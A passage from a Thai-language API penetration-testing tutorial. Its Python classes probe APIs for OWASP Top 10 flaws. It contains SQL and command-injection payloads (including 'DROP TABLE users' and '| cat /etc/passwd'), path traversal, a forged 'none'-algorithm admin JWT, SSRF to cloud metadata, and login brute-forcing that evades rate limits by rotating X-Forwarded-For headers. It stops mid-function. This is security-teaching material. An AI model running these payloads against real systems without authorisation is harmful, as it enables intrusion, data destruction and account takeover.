# Part 67: API Security Testing (Steps 661-670)

## ภาพรวม
การทดสอบความปลอดภัยของ REST API, GraphQL, gRPC และ WebSocket ตาม OWASP API Security Top 10

---

## Step 661: OWASP API Security Top 10

```python
#!/usr/bin/env python3
# OWASP API Security Testing - API1-API10

from dataclasses import dataclass, field
from typing import List, Dict, Optional
import requests
import json
import re
from urllib.parse import urljoin, urlparse

@dataclass
class APIVulnerability:
    api_id: str  # API1, API2, etc.
    name: str
    severity: str
    endpoint: str
    method: str
    description: str
    proof: str
    remediation: str

class OWASPAPITester:
    def __init__(self, base_url: str, headers: Dict = None):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update(headers or {})
        self.vulnerabilities: List[APIVulnerability] = []
    
    def test_api1_bola(self, endpoint: str, 
                       object_ids: List[str]) -> List[APIVulnerability]:
        """
        API1: Broken Object Level Authorization (BOLA/IDOR)
        Access other users' objects by manipulating ID
        """
        vulns = []
        
        for obj_id in object_ids:
            url = f"{self.base_url}{endpoint}/{obj_id}"
            
            try:
                response = self.session.get(url, timeout=10)
                
                if response.status_code == 200:
                    vulns.append(APIVulnerability(
                        api_id="API1",
                        name="Broken Object Level Authorization",
                        severity="CRITICAL",
                        endpoint=url,
                        method="GET",
                        description=f"Can access object {obj_id} without authorization check",
                        proof=f"HTTP {response.status_code}: {response.text[:200]}",
                        remediation="Implement object-level authorization for each request"
                    ))
            except requests.RequestException:
                pass
        
        return vulns
    
    def test_api2_broken_auth(self, auth_endpoints: List[str]) -> List[APIVulnerability]:
        """
        API2: Broken Authentication
        Weak tokens, no rate limiting, missing 2FA
        """
        vulns = []
        
        for endpoint in auth_endpoints:
            url = f"{self.base_url}{endpoint}"
            
            # Test 1: Rate limiting on login
            responses = []
            for i in range(20):
                resp = self.session.post(url, 
                    json={"username": "test@test.com", "password": f"wrong{i}"},
                    timeout=5
                )
                responses.append(resp.status_code)
            
            if all(r != 429 for r in responses):  # No 429 Too Many Requests
                vulns.append(APIVulnerability(
                    api_id="API2",
                    name="No Rate Limiting on Authentication",
                    severity="HIGH",
                    endpoint=url,
                    method="POST",
                    description="No rate limiting detected on authentication endpoint",
                    proof=f"20 requests returned: {set(responses)}",
                    remediation="Implement rate limiting, account lockout, and CAPTCHA"
                ))
            
            # Test 2: JWT none algorithm
            fake_token = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0."
            resp = self.session.get(
                f"{self.base_url}/api/admin",
                headers={"Authorization": f"Bearer {fake_token}"},
                timeout=5
            )
            if resp.status_code == 200:
                vulns.append(APIVulnerability(
                    api_id="API2",
                    name="JWT None Algorithm Accepted",
                    severity="CRITICAL",
                    endpoint=f"{self.base_url}/api/admin",
                    method="GET",
                    description="Server accepts JWT with 'none' algorithm",
                    proof=f"Response: {resp.status_code}",
                    remediation="Reject JWTs with 'none' algorithm, validate algorithm server-side"
                ))
        
        return vulns
    
    def test_api3_excessive_data(self, endpoints: List[str]) -> List[APIVulnerability]:
        """
        API3: Excessive Data Exposure
        API returns more fields than needed
        """
        vulns = []
        sensitive_fields = [
            'password', 'pwd', 'secret', 'token', 'api_key', 'ssn',
            'credit_card', 'cvv', 'social_security', 'bank_account',
            'private_key', 'hash', 'salt'
        ]
        
        for endpoint in endpoints:
            url = f"{self.base_url}{endpoint}"
            try:
                response = self.session.get(url, timeout=10)
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        data_str = json.dumps(data).lower()
                        
                        found_sensitive = [
                            f for f in sensitive_fields
                            if f in data_str
                        ]
                        
                        if found_sensitive:
                            vulns.append(APIVulnerability(
                                api_id="API3",
                                name="Excessive Data Exposure",
                                severity="HIGH",
                                endpoint=url,
                                method="GET",
                                description=f"API exposes sensitive fields: {found_sensitive}",
                                proof=f"Fields found in response: {found_sensitive}",
                                remediation="Implement response filtering, use DTOs/serializers"
                            ))
                    except json.JSONDecodeError:
                        pass
            except requests.RequestException:
                pass
        
        return vulns
    
    def test_api4_lack_of_resources(self, endpoint: str) -> List[APIVulnerability]:
        """
        API4: Lack of Resources & Rate Limiting
        No limits on request size, count, or resources
        """
        vulns = []
        
        # Test large payload
        large_payload = {"data": "A" * 1000000}  # 1MB payload
        url = f"{self.base_url}{endpoint}"
        
        try:
            response = self.session.post(url, json=large_payload, timeout=30)
            if response.status_code != 413:  # 413 Payload Too Large
                vulns.append(APIVulnerability(
                    api_id="API4",
                    name="No Payload Size Limit",
                    severity="MEDIUM",
                    endpoint=url,
                    method="POST",
                    description="API accepts very large payloads without restriction",
                    proof=f"1MB payload accepted with status {response.status_code}",
                    remediation="Implement max payload size limits"
                ))
        except requests.RequestException:
            pass
        
        # Test large page parameter
        url_with_limit = f"{self.base_url}{endpoint}?limit=99999999"
        try:
            response = self.session.get(url_with_limit, timeout=30)
            if response.status_code == 200:
                data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}
                if isinstance(data, list) and len(data) > 1000:
                    vulns.append(APIVulnerability(
                        api_id="API4",
                        name="No Pagination Limit",
                        severity="MEDIUM",
                        endpoint=url_with_limit,
                        method="GET",
                        description="API returns unlimited records without pagination cap",
                        proof=f"Returned {len(data)} records",
                        remediation="Enforce maximum page size (e.g., 100 records)"
                    ))
        except Exception:
            pass
        
        return vulns
    
    def test_api5_broken_function_auth(self, admin_endpoints: List[str]) -> List[APIVulnerability]:
        """
        API5: Broken Function Level Authorization
        Regular users accessing admin functions
        """
        vulns = []
        
        for endpoint in admin_endpoints:
            url = f"{self.base_url}{endpoint}"
            
            # Try as unauthenticated
            try:
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    vulns.append(APIVulnerability(
                        api_id="API5",
                        name="Admin Endpoint Accessible Without Auth",
                        severity="CRITICAL",
                        endpoint=url,
                        method="GET",
                        description="Admin endpoint accessible without authentication",
                        proof=f"HTTP {response.status_code} returned",
                        remediation="Implement function-level authorization checks"
                    ))
            except requests.RequestException:
                pass
        
        return vulns
    
    def test_api8_injection(self, endpoints: List[Dict]) -> List[APIVulnerability]:
        """
        API8: Injection (SQLi, NoSQLi, Command Injection)
        """
        vulns = []
        
        injection_payloads = {
            "sqli": [
                "'", "' OR '1'='1", "' OR '1'='1' --",
                "'; DROP TABLE users; --", "1 UNION SELECT 1,2,3--"
            ],
            "nosqli": [
                '{"$gt": ""}',
                '{"$where": "1==1"}',
                '{"$regex": ".*"}'
            ],
            "xss": [
                "<script>alert(1)</script>",
                "\"'><svg onload=alert(1)>",
                "javascript:alert(1)"
            ]
        }
        
        for endpoint_info in endpoints:
            url = f"{self.base_url}{endpoint_info['path']}"
            param = endpoint_info.get('param', 'q')
            
            for inj_type, payloads in injection_payloads.items():
                for payload in payloads:
                    try:
                        if endpoint_info.get('method', 'GET').upper() == 'GET':
                            response = self.session.get(
                                url, params={param: payload}, timeout=10
                            )
                        else:
                            response = self.session.post(
                                url, json={param: payload}, timeout=10
                            )
                        
                        # Check for injection indicators in response
                        indicators = {
                            "sqli": ["SQL", "MySQL", "syntax error", "ORA-", "SQLSTATE"],
                            "nosqli": ["MongoError", "CastError", "BSONTypeError"],
                            "xss": [payload]
                        }
                        
                        for indicator in indicators.get(inj_type, []):
                            if indicator in response.text:
                                vulns.append(APIVulnerability(
                                    api_id="API8",
                                    name=f"{inj_type.upper()} Injection",
                                    severity="CRITICAL",
                                    endpoint=url,
                                    method=endpoint_info.get('method', 'GET'),
                                    description=f"{inj_type} injection payload returned error/data",
                                    proof=f"Payload: {payload} -> Response contains: {indicator}",
                                    remediation="Use parameterized queries, input validation, WAF"
                                ))
                                break
                    except requests.RequestException:
                        pass
        
        return vulns
    
    def run_full_assessment(self, config: Dict) -> Dict:
        """Run complete API security assessment"""
        all_vulns = []
        
        # BOLA test
        if 'object_endpoints' in config:
            for ep_config in config['object_endpoints']:
                vulns = self.test_api1_bola(
                    ep_config['path'], ep_config['ids']
                )
                all_vulns.extend(vulns)
        
        # Auth test
        if 'auth_endpoints' in config:
            vulns = self.test_api2_broken_auth(config['auth_endpoints'])
            all_vulns.extend(vulns)
        
        # Injection test
        if 'injectable_endpoints' in config:
            vulns = self.test_api8_injection(config['injectable_endpoints'])
            all_vulns.extend(vulns)
        
        severity_count = {
            'CRITICAL': sum(1 for v in all_vulns if v.severity == 'CRITICAL'),
            'HIGH': sum(1 for v in all_vulns if v.severity == 'HIGH'),
            'MEDIUM': sum(1 for v in all_vulns if v.severity == 'MEDIUM'),
            'LOW': sum(1 for v in all_vulns if v.severity == 'LOW')
        }
        
        return {
            'total_vulnerabilities': len(all_vulns),
            'severity_breakdown': severity_count,
            'vulnerabilities': [
                {
                    'id': v.api_id, 'name': v.name, 'severity': v.severity,
                    'endpoint': v.endpoint, 'description': v.description,
                    'remediation': v.remediation
                }
                for v in all_vulns
            ]
        }


if __name__ == '__main__':
    tester = OWASPAPITester("http://vulnerable-api.example.com")
    
    print("OWASP API Security Top 10:")
    owasp_list = [
        ("API1", "Broken Object Level Authorization (BOLA/IDOR)"),
        ("API2", "Broken Authentication"),
        ("API3", "Excessive Data Exposure"),
        ("API4", "Lack of Resources & Rate Limiting"),
        ("API5", "Broken Function Level Authorization"),
        ("API6", "Mass Assignment"),
        ("API7", "Security Misconfiguration"),
        ("API8", "Injection"),
        ("API9", "Improper Assets Management"),
        ("API10", "Insufficient Logging & Monitoring")
    ]
    
    for api_id, name in owasp_list:
        print(f"  {api_id}: {name}")
```

---

## Step 662: REST API Fuzzing

```python
#!/usr/bin/env python3
# REST API Fuzzing - ค้นหาช่องโหว่ใน REST API

from dataclasses import dataclass, field
from typing import List, Dict, Optional, Iterator
import requests
import json
import string
import itertools
from urllib.parse import quote

@dataclass
class FuzzResult:
    endpoint: str
    method: str
    payload: str
    response_code: int
    response_length: int
    response_time: float
    interesting: bool = False
    reason: str = ""

class APIFuzzer:
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.results: List[FuzzResult] = []
    
    def fuzz_path_parameters(self, endpoint_template: str, 
                              wordlist: List[str]) -> List[FuzzResult]:
        """เปลี่ยน path parameters เพื่อหา IDOR"""
        results = []
        
        # Common ID patterns
        id_payloads = [
            # Numeric IDs
            *[str(i) for i in range(1, 20)],
            # UUIDs
            "00000000-0000-0000-0000-000000000001",
            # Admin-related
            "admin", "administrator", "0", "-1",
            # Path traversal
            "../admin", "../../etc/passwd",
            # Type confusion
            "null", "true", "false", "{}"
        ]
        
        for payload in id_payloads + wordlist:
            url = f"{self.base_url}{endpoint_template.replace('{id}', quote(str(payload)))}"
            
            try:
                import time
                start = time.time()
                response = self.session.get(url, timeout=10)
                elapsed = time.time() - start
                
                interesting = response.status_code not in [404, 401, 403]
                reason = ""
                
                if response.status_code == 200:
                    reason = "Access granted"
                elif response.status_code == 500:
                    reason = "Server error - possible SQL error"
                
                result = FuzzResult(
                    endpoint=url,
                    method="GET",
                    payload=str(payload),
                    response_code=response.status_code,
                    response_length=len(response.content),
                    response_time=elapsed,
                    interesting=interesting,
                    reason=reason
                )
                results.append(result)
                
            except requests.RequestException:
                pass
        
        return [r for r in results if r.interesting]
    
    def fuzz_headers(self, endpoint: str, 
                     header_payloads: List[Dict]) -> List[FuzzResult]:
        """ฟาส HTTP Headers เพื่อหา injection"""
        results = []
        url = f"{self.base_url}{endpoint}"
        
        # Header injection payloads
        default_payloads = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "localhost"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"Host": "localhost"},
            {"X-Admin": "true"},
            {"X-Role": "admin"},
            {"X-Override-Role": "admin"},
            {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
        ]
        
        for headers in (header_payloads or default_payloads):
            try:
                import time
                start = time.time()
                response = self.session.get(
                    url, headers=headers, timeout=10
                )
                elapsed = time.time() - start
                
                interesting = response.status_code == 200
                
                results.append(FuzzResult(
                    endpoint=url,
                    method="GET",
                    payload=str(headers),
                    response_code=response.status_code,
                    response_length=len(response.content),
                    response_time=elapsed,
                    interesting=interesting,
                    reason="Access via header manipulation" if interesting else ""
                ))
            except requests.RequestException:
                pass
        
        return [r for r in results if r.interesting]
    
    def fuzz_json_body(self, endpoint: str, 
                       base_payload: Dict) -> List[FuzzResult]:
        """ฟาส JSON body เพื่อหา injection"""
        results = []
        url = f"{self.base_url}{endpoint}"
        
        # Generate fuzzing payloads
        injection_values = [
            "'", "\"'\"", "<script>alert(1)</script>",
            "' OR '1'='1", "1; DROP TABLE--",
            "../etc/passwd", "%00", "\x00",
            {"$gt": ""},  # NoSQLi
            ["array", "injection"],
            None, True, False, 0, -1, 99999999
        ]
        
        for field_name in base_payload.keys():
            for payload in injection_values:
                test_payload = dict(base_payload)
                test_payload[field_name] = payload
                
                try:
                    import time
                    start = time.time()
                    response = self.session.post(
                        url, json=test_payload, timeout=10
                    )
                    elapsed = time.time() - start
                    
                    # Check for interesting responses
                    interesting = False
                    reason = ""
                    
                    if response.status_code == 500:
                        interesting = True
                        reason = f"Server error with payload in {field_name}"
                    elif "error" in response.text.lower() and "sql" in response.text.lower():
                        interesting = True
                        reason = f"SQL error leaked"
                    elif response.status_code == 200 and payload in ["' OR '1'='1"]:
                        interesting = True
                        reason = f"Possible SQLi - success with injection payload"
                    
                    if interesting:
                        results.append(FuzzResult(
                            endpoint=url,
                            method="POST",
                            payload=f"{field_name}={payload}",
                            response_code=response.status_code,
                            response_length=len(response.content),
                            response_time=elapsed,
                            interesting=True,
                            reason=reason
                        ))
                except requests.RequestException:
                    pass
        
        return results
    
    def enumerate_endpoints(self, base_path: str = "/api") -> List[str]:
        """Enumerate hidden API endpoints"""
        # Common API paths
        wordlist = [
            "v1", "v2", "v3", "admin", "internal",
            "users", "user", "accounts", "account",
            "profile", "settings", "config", "configuration",
            "auth", "login", "logout", "register",
            "token", "refresh", "verify",
            "files", "upload", "download",
            "search", "query",
            "health", "status", "ping",
            "debug", "test", "swagger", "openapi",
            "graphql", "graphiql"
        ]
        
        found = []
        for word in wordlist:
            url = f"{self.base_url}{base_path}/{word}"
            try:
                response = requests.get(url, timeout=5)
                if response.status_code not in [404, 410]:
                    found.append({
                        "url": url,
                        "status": response.status_code,
                        "length": len(response.content)
                    })
            except requests.RequestException:
                pass
        
        return found


if __name__ == '__main__':
    fuzzer = APIFuzzer("http://target-api.local")
    
    print("API Fuzzer ready")
    print("\nPath Parameter Fuzzing:")
    print("  fuzzer.fuzz_path_parameters('/api/users/{id}', wordlist=[])")
    print("\nHeader Fuzzing:")
    print("  fuzzer.fuzz_headers('/api/admin', header_payloads=[])")
    print("\nEndpoint Discovery:")
    print("  found = fuzzer.enumerate_endpoints('/api')")
    
    # Generate sample payloads report
    print("\nSample Injection Payloads:")
    payloads = [
        ("SQLi", ["'", "' OR 1=1--", "1; DROP TABLE users--"]),
        ("NoSQLi", ['{"$gt":""}', '{"$where":"1==1"}']),
        ("Path Traversal", ["../etc/passwd", "../../windows/win.ini"]),
        ("Command Injection", ["; ls -la", "| cat /etc/passwd", "`id`"])
    ]
    for ptype, samples in payloads:
        print(f"  {ptype}:")
        for s in samples:
            print(f"    {s}")
```

---

## Step 663: GraphQL Security Testing

```python
#!/usr/bin/env python3
# GraphQL Security Testing - เจาะ GraphQL APIs

from dataclasses import dataclass, field
from typing import List, Dict, Optional
import requests
import json

@dataclass
class GraphQLVuln:
    type: str
    severity: str
    description: str
    query: str
    result: str

class GraphQLTester:
    def __init__(self, url: str, headers: Dict = None):
        self.url = url
        self.headers = headers or {"Content-Type": "application/json"}
    
    def send_query(self, query: str, 
                   variables: Dict = None) -> Dict:
        """Send GraphQL query"""
        payload = {"query": query}
        if variables:
            payload["variables"] = variables
        
        try:
            response = requests.post(
                self.url,
                json=payload,
                headers=self.headers,
                timeout=10
            )
            return {"status": response.status_code, "data": response.json()}
        except Exception as e:
            return {"error": str(e)}
    
    def introspection_query(self) -> Dict:
        """ดึงข้อมูล Schema ด้วย Introspection"""
        query = """
        {
          __schema {
            types {
              name
              kind
              fields {
                name
                type { name kind }
              }
            }
            queryType { name }
            mutationType { name }
          }
        }
        """
        return self.send_query(query)
    
    def test_introspection_enabled(self) -> GraphQLVuln:
        """ตรวจสอบว่า Introspection ถูกเปิดใช้งานหรือไม่"""
        result = self.introspection_query()
        
        if "data" in result.get("data", {}) or \
           "__schema" in str(result):
            return GraphQLVuln(
                type="Introspection Enabled",
                severity="MEDIUM",
                description="GraphQL introspection is enabled - full schema exposed",
                query="{__schema{types{name}}}",
                result="Schema retrieved successfully"
            )
        
        return GraphQLVuln(
            type="Introspection Disabled",
            severity="INFO",
            description="GraphQL introspection is disabled",
            query="{__schema{types{name}}}",
            result="Introspection blocked"
        )
    
    def test_field_suggestions(self) -> Optional[GraphQLVuln]:
        """Test if field name suggestions reveal schema information"""
        # Send intentionally wrong field name
        query = "{__typen"
        result = self.send_query(query)
        
        error_msg = str(result)
        if "Did you mean" in error_msg or "did_you_mean" in error_msg:
            return GraphQLVuln(
                type="Schema Disclosure via Field Suggestions",
                severity="LOW",
                description="Server reveals field names in error messages",
                query=query,
                result=error_msg[:200]
            )
        return None
    
    def test_batch_queries(self, queries: List[str]) -> Optional[GraphQLVuln]:
        """Test batch query support (potential DoS / auth bypass)"""
        batch = [{"query": q} for q in queries]
        
        try:
            response = requests.post(
                self.url, json=batch,
                headers=self.headers, timeout=30
            )
            
            if response.status_code == 200 and isinstance(response.json(), list):
                return GraphQLVuln(
                    type="Batch Query Support",
                    severity="MEDIUM",
                    description="GraphQL supports batch queries - can amplify attacks",
                    query=str(batch[:2]),
                    result=f"Batch of {len(queries)} queries processed"
                )
        except Exception:
            pass
        return None
    
    def test_deep_nesting_dos(self, depth: int = 20) -> Optional[GraphQLVuln]:
        """Test deeply nested query (DoS potential)"""
        # Build deeply nested query
        inner = "name"
        for _ in range(depth):
            inner = f"friends {{ {inner} }}"
        
        query = f"{{ user(id: 1) {{ {inner} }} }}"
        
        try:
            import time
            start = time.time()
            result = self.send_query(query)
            elapsed = time.time() - start
            
            if elapsed > 5:  # Took more than 5 seconds
                return GraphQLVuln(
                    type="Deep Query DoS",
                    severity="HIGH",
                    description=f"Deeply nested query ({depth} levels) causes slowdown",
                    query=query[:200],
                    result=f"Query took {elapsed:.2f} seconds"
                )
        except Exception:
            pass
        return None
    
    def test_graphql_injection(self) -> List[GraphQLVuln]:
        """Test for injection in GraphQL arguments"""
        vulns = []
        
        injection_payloads = [
            # NoSQL injection via GraphQL
            '{"$gt": ""}',
            '{"$where": "1==1"}',
            # SSRF via URL arguments  
            "http://169.254.169.254/latest/meta-data/",
            # Object injection
            "__proto__[admin]=true"
        ]
        
        for payload in injection_payloads:
            query = f'{{ user(id: "{payload}") {{ name email }} }}'
            result = self.send_query(query)
            result_str = str(result)
            
            if ("error" not in result_str.lower() and 
                result.get("data", {}).get("status") == 200):
                vulns.append(GraphQLVuln(
                    type="GraphQL Injection",
                    severity="HIGH",
                    description=f"Injection payload succeeded: {payload[:50]}",
                    query=query,
                    result=result_str[:200]
                ))
        
        return vulns
    
    def graphql_wordlist_attack(self) -> List[str]:
        """Common GraphQL queries to discover endpoints"""
        return [
            # Discover types
            '{__typename}',
            '{__schema{queryType{name}}}',
            # Common queries
            '{users{id name email}}',
            '{currentUser{id role permissions}}',
            '{admin{users{id name email password}}}',
            # Mutations
            'mutation{login(username:"admin",password:"admin"){token}}',
            # Subscriptions
            'subscription{newUser{id name}}'
        ]


if __name__ == '__main__':
    tester = GraphQLTester("http://localhost:4000/graphql")
    
    print("GraphQL Security Tests:")
    print("1. Introspection - reveals full schema")
    print("2. Field suggestions - schema info in errors")
    print("3. Batch queries - amplification attacks")
    print("4. Deep nesting - DoS vector")
    print("5. Injection via arguments")
    
    print("\nCommon GraphQL Attack Queries:")
    for query in tester.graphql_wordlist_attack():
        print(f"  {query[:80]}")
    
    print("\nRecommended Tools:")
    tools = {
        "graphw00f": "python3 graphw00f.py -d -t http://target/graphql",
        "graphql-cop": "python3 graphql-cop.py -t http://target/graphql",
        "clairvoyance": "python3 -m clairvoyance -o schema.json http://target/graphql",
        "inql_burp": "InQL Burp Extension - import schema, generate queries"
    }
    for tool, usage in tools.items():
        print(f"  {tool}: {usage}")
```

---

## Step 664: API Authentication Testing

```python
#!/usr/bin/env python3
# API Authentication & Authorization Testing - ตรวจสอบการยืนยันตัวตน

from dataclasses import dataclass, field
from typing import List, Dict, Optional
import requests
import base64
import hashlib
import time
import json

@dataclass
class AuthTestResult:
    test_name: str
    passed: bool
    severity: str
    details: str
    recommendation: str

class APIAuthTester:
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
    
    def test_api_key_in_url(self, endpoints: List[str]) -> List[AuthTestResult]:
        """Check if API keys are exposed in URL"""
        results = []
        
        # Check URL parameters for API keys
        api_key_params = ['api_key', 'apikey', 'key', 'token', 'access_token', 'auth']
        
        for endpoint in endpoints:
            url = f"{self.base_url}{endpoint}"
            try:
                response = self.session.get(url, timeout=5)
                # Check if server logs/returns API key in URL
                final_url = response.url
                
                for param in api_key_params:
                    if f"{param}=" in final_url.lower():
                        results.append(AuthTestResult(
                            test_name="API Key in URL",
                            passed=False,
                            severity="HIGH",
                            details=f"API key exposed in URL parameter: {param}",
                            recommendation="Use Authorization header instead of URL parameters"
                        ))
            except requests.RequestException:
                pass
        
        return results
    
    def test_token_reuse_after_logout(self, login_url: str,
                                       protected_url: str,
                                       credentials: Dict) -> AuthTestResult:
        """Test if tokens remain valid after logout"""
        # Login
        login_resp = self.session.post(
            f"{self.base_url}{login_url}",
            json=credentials, timeout=10
        )
        
        if login_resp.status_code != 200:
            return AuthTestResult(
                test_name="Token Reuse After Logout",
                passed=True,
                severity="INFO",
                details="Could not obtain token for testing",
                recommendation="N/A"
            )
        
        token = login_resp.json().get('token', login_resp.json().get('access_token', ''))
        
        # Access protected resource
        headers = {"Authorization": f"Bearer {token}"}
        before_logout = self.session.get(
            f"{self.base_url}{protected_url}",
            headers=headers, timeout=10
        )
        
        # Logout
        self.session.post(f"{self.base_url}/logout", headers=headers, timeout=10)
        
        # Try to access with same token after logout
        after_logout = self.session.get(
            f"{self.base_url}{protected_url}",
            headers=headers, timeout=10
        )
        
        if after_logout.status_code == 200:
            return AuthTestResult(
                test_name="Token Reuse After Logout",
                passed=False,
                severity="HIGH",
                details="Token remains valid after logout",
                recommendation="Implement token blacklisting or use short-lived tokens with refresh"
            )
        
        return AuthTestResult(
            test_name="Token Reuse After Logout",
            passed=True,
            severity="INFO",
            details="Token properly invalidated after logout",
            recommendation="Continue current implementation"
        )
    
    def test_privilege_escalation(self, endpoints: List[Dict]) -> List[AuthTestResult]:
        """Test horizontal and vertical privilege escalation"""
        results = []
        
        for ep in endpoints:
            url = f"{self.base_url}{ep['path']}"
            user_token = ep.get('user_token', '')
            admin_token = ep.get('admin_token', '')
            
            # Test 1: User accessing admin endpoint
            if user_token and ep.get('requires_admin', False):
                resp = self.session.get(
                    url,
                    headers={"Authorization": f"Bearer {user_token}"},
                    timeout=10
                )
                
                if resp.status_code == 200:
                    results.append(AuthTestResult(
                        test_name="Vertical Privilege Escalation",
                        passed=False,
                        severity="CRITICAL",
                        details=f"Regular user can access admin endpoint: {url}",
                        recommendation="Implement role-based access control (RBAC)"
                    ))
            
            # Test 2: User accessing another user's data
            if ep.get('other_user_id') and user_token:
                other_url = url.replace('{user_id}', str(ep['other_user_id']))
                resp = self.session.get(
                    other_url,
                    headers={"Authorization": f"Bearer {user_token}"},
                    timeout=10
                )
                
                if resp.status_code == 200:
                    results.append(AuthTestResult(
                        test_name="Horizontal Privilege Escalation (BOLA)",
                        passed=False,
                        severity="HIGH",
                        details=f"User can access another user's data: {other_url}",
                        recommendation="Verify resource ownership on each request"
                    ))
        
        return results
    
    def test_mass_assignment(self, register_url: str) -> AuthTestResult:
        """
        API6: Mass Assignment
        Send extra fields during creation to gain elevated privileges
        """
        payloads = [
            # Try to set admin/role during registration
            {"username": "attacker", "password": "Test123!",
             "role": "admin", "is_admin": True, "admin": True},
            {"username": "attacker2", "password": "Test123!",
             "permissions": ["admin", "create", "delete"],
             "subscription_tier": "enterprise"},
            {"username": "attacker3", "password": "Test123!",
             "balance": 99999, "credits": 9999}
        ]
        
        for payload in payloads:
            try:
                response = self.session.post(
                    f"{self.base_url}{register_url}",
                    json=payload, timeout=10
                )
                
                if response.status_code in [200, 201]:
                    resp_data = response.json()
                    resp_str = str(resp_data)
                    
                    # Check if elevated fields were accepted
                    if any(field in resp_str for field in ['admin', 'true', '99999']):
                        return AuthTestResult(
                            test_name="Mass Assignment",
                            passed=False,
                            severity="HIGH",
                            details=f"Server accepted elevated fields: {payload}",
                            recommendation="Use allowlists for permitted fields, not blocklists"
                        )
            except Exception:
                pass
        
        return AuthTestResult(
            test_name="Mass Assignment",
            passed=True,
            severity="INFO",
            details="No mass assignment vulnerability detected",
            recommendation="Continue filtering requests with field allowlists"
        )
    
    def test_cors_configuration(self, endpoint: str) -> List[AuthTestResult]:
        """Check CORS misconfiguration"""
        results = []
        test_origins = [
            "https://evil.com",
            "https://attacker.com",
            "null"
        ]
        
        url = f"{self.base_url}{endpoint}"
        
        for origin in test_origins:
            try:
                response = requests.options(
                    url,
                    headers={"Origin": origin},
                    timeout=10
                )
                
                acao = response.headers.get('Access-Control-Allow-Origin', '')
                acac = response.headers.get('Access-Control-Allow-Credentials', '')
                
                if acao == origin or acao == '*':
                    severity = "CRITICAL" if (acac.lower() == 'true' and origin != '*') else "MEDIUM"
                    results.append(AuthTestResult(
                        test_name="CORS Misconfiguration",
                        passed=False,
                        severity=severity,
                        details=f"Origin '{origin}' reflected in ACAO header (credentials: {acac})",
                        recommendation="Whitelist specific trusted origins, not wildcard *"
                    ))
            except requests.RequestException:
                pass
        
        return results


if __name__ == '__main__':
    tester = APIAuthTester("http://api.target.local")
    
    print("API Authentication Tests:")
    tests = [
        "test_api_key_in_url - Check API keys exposed in URL params",
        "test_token_reuse_after_logout - Verify tokens invalidated",
        "test_privilege_escalation - Test RBAC enforcement",
        "test_mass_assignment - Test unauthorized field assignment",
        "test_cors_configuration - Check CORS policy"
    ]
    
    for test in tests:
        print(f"  - {test}")
    
    print("\nAuto-testing CORS:")
    print("  curl -H 'Origin: https://evil.com' -I https://api.target.com/v1/users")
    print("  Look for: Access-Control-Allow-Origin: https://evil.com")
    print("  Dangerous: ACAO: * with ACAC: true")
```

---

## Steps 665-670: API Security Advanced Topics

```python
#!/usr/bin/env python3
# Advanced API Security - WebSocket, gRPC, Rate Limiting Bypass

from dataclasses import dataclass, field
from typing import List, Dict, Optional
import requests
import json
import time

@dataclass
class APISecurityFinding:
    category: str
    severity: str
    title: str
    description: str
    poc: str
    remediation: str

class AdvancedAPITester:
    def __init__(self, target: str):
        self.target = target
    
    def test_websocket_injection(self) -> str:
        """WebSocket security testing approaches"""
        return """
# WebSocket Security Testing
# Tools: wscat, Burp Suite WebSocket tab, OWASP ZAP

# 1. Connect and enumerate
$ wscat -c wss://target.com/ws
> {"type": "subscribe", "channel": "updates"}
> {"type": "get_users"}  # Try unauthorized operations

# 2. Message injection
> {"type": "message", "to": "admin@company.com", "body": "XSS test: <script>alert(1)</script>"}

# 3. IDOR via WebSocket
> {"action": "get_profile", "user_id": 1}  # Try other user IDs
> {"action": "get_profile", "user_id": 2}  # Should be unauthorized

# Python WebSocket client:
import websocket
import json

def on_message(ws, message):
    print(f"Received: {message}")

def on_open(ws):
    # Send test payload
    ws.send(json.dumps({"type": "auth", "token": "test"}))
    ws.send(json.dumps({"action": "get_all_users"}))  # Privileged action

ws = websocket.WebSocketApp(
    "wss://target.com/ws",
    on_message=on_message,
    on_open=on_open
)
ws.run_forever()
        """
    
    def test_rate_limiting_bypass(self, endpoint: str) -> Dict:
        """Techniques to bypass rate limiting"""
        bypass_techniques = [
            {
                "name": "IP Rotation via X-Forwarded-For",
                "headers": {"X-Forwarded-For": "1.2.3.{i}"},
                "description": "Change apparent IP by modifying proxy headers"
            },
            {
                "name": "Username Variation",
                "description": "USER = user = User@domain.com = USER@DOMAIN.COM",
                "example": "admin, ADMIN, Admin, admin@, \"admin\""
            },
            {
                "name": "Path Variation",
                "description": "//api/login vs /api/login vs /api//login",
                "example": "Different URL encoding of same endpoint"
            },
            {
                "name": "Content-Type Variation",
                "description": "Switch between JSON and form-urlencoded",
                "example": "application/json vs application/x-www-form-urlencoded"
            }
        ]
        
        results = {"bypass_attempts": [], "url": f"{self.target}{endpoint}"}
        
        # Attempt 1: X-Forwarded-For rotation
        for i in range(30):
            headers = {"X-Forwarded-For": f"10.{i//256}.{i%256}.1"}
            try:
                response = requests.post(
                    f"{self.target}{endpoint}",
                    json={"username": "admin", "password": f"wrong{i}"},
                    headers=headers, timeout=5
                )
                if response.status_code != 429:
                    results["bypass_attempts"].append({
                        "technique": "X-Forwarded-For",
                        "attempt": i,
                        "status": response.status_code
                    })
            except requests.RequestException:
                break
        
        return results
    
    def test_api_versioning_security(self, base_path: str = "/api") -> List[Dict]:
        """Test if old API versions have security weaknesses"""
        versions = ["v1", "v2", "v3", "v0", "beta", "legacy", "1", "2", "3"]
        findings = []
        
        for version in versions:
            url = f"{self.target}{base_path}/{version}"
            try:
                response = requests.get(url, timeout=5)
                if response.status_code != 404:
                    findings.append({
                        "url": url,
                        "status": response.status_code,
                        "note": "Old API version accessible - may lack current security controls"
                    })
            except requests.RequestException:
                pass
        
        return findings
    
    def ssrf_via_api(self, ssrf_endpoints: List[str]) -> List[Dict]:
        """
